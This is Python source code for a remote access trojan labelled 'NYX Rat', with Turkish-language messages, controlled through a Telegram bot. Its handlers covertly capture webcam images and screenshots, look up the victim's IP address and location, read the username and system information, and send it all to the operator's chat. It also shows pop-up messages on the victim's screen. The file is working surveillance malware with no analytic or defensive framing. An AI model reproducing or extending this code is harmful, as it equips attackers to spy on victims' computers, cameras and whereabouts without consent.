import os, requests, subprocess
import pyautogui
import telebot
import win32gui
import cv2

bot = telebot.TeleBot("TelegramBotToken")


class Fonkss():

    def Location_(self):
        r = requests.get("https://ipinfo.io/").json()
        return r["ip"], r["loc"]

    def Message_Bot(self,title, message):
        win32gui.MessageBox(0,message,title,0)

    def WhoAmi(self):
        return os.getenv('username')

    def WebCamFonks(self):
        path = os.getenv("APPDATA")+os.sep+"v.png"
        camera = cv2.VideoCapture(0)
        return_value, image = camera.read()
        cv2.imwrite(path, image)
        camera.release()
        cv2.destroyAllWindows()
        return path


fonks = Fonkss()

@bot.message_handler(commands=['Start'])
def handle_command(message):
    bot.reply_to(message,"✮ NYX Rat Kullanıma Hazır ✮ "
                         f"\nMerhaba {message.from_user.first_name} ! "
                         f"\n\nKomutlar : /Commands",
                 )

@bot.message_handler(commands=["location"])
def Location(message):
    bot.send_message(message.from_user.id, f"İp : {fonks.Location_()[0]}")
    bot.send_location(message.from_user.id,(fonks.Location_()[1].split(",")[0]),(fonks.Location_()[1].split(",")[1]))


@bot.message_handler(commands=["MessageBox"])
def Message_Box_(message):
    mes = str(message.text)
    message_ = mes[mes.find("x")+1:].split(",")
    try:
        fonks.Message_Bot(message_[0], message_[1])
        bot.reply_to(message, "Pencere Başarıyla Açıldı ve Kullanıcı tarafından kapatıldı")
    except IndexError:
        bot.reply_to(message,"Hata Yanlış değer girildi, Lütfen tekrar deneyin ! ")



@bot.message_handler(commands=["Systeminfo"])
def SystemInfo_(message):
    Sysinfo = subprocess.check_output("systeminfo", shell=True)
    bot.reply_to(message, str(Sysinfo))


@bot.message_handler(commands=["Screenshot"])
def ScreenShot_(message):
    screen = pyautogui.screenshot()
    screen.save(os.getenv("APPDATA")+os.sep+"k.png")
    bot.send_photo(message.from_user.id, photo=open(os.getenv("APPDATA")+os.sep+'k.png', "rb"))
    os.remove(os.getenv("APPDATA")+os.sep+"k.png")

@bot.message_handler(commands=["whoami"])
def Whoami_(message):
    bot.reply_to(message,fonks.WhoAmi())


@bot.message_handler(commands=["Webcam"])
def WebCam(message):
    bot.send_photo(message.from_user.id, photo=open(fonks.WebCamFonks(),"rb"))



@bot.message_handler(commands=["Commands"])
def Command_List(message):
    bot.reply_to(message,"\n🔴 Komutlar 🔴"
                         "\n/Screenshot : Ekran Görüntüsü alır."
                         "\n/location : Konum bilgilerini gösterir."
                         "\n/MessageBox : Ekranda mesaj kutusu Gösterir. exp(/MessageBox title , message )."
                         "\n/Systeminfo : Sistem özelliklerini gösterir. "
                         "\n/Webcam : Kamera'dan resim çeker."
                         "\n/whoami : Kullanıcı adını gösterir.")




bot.polling()


